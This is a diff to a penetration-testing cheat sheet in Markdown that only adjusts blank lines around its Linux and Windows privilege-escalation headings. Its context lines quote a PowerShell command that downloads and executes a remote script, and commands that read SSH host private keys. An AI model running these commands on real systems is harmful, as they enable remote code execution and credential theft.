@@ -100,7 +100,9 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.1
 
 # Privilege Escalation
 
+
 ## Linux PrivEsc
+
 
 ### Linux - Automated Scripts 
 
@@ -128,7 +130,6 @@ export SHELL=bash
 
 stty rows \<> colums \<> 
 ````
-
 
 ### Application Config Files 
 
@@ -247,7 +248,9 @@ cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
 ````
 
+
 ## Windows PrivEsc
+
 
 ### Windows - Automated Tools
 
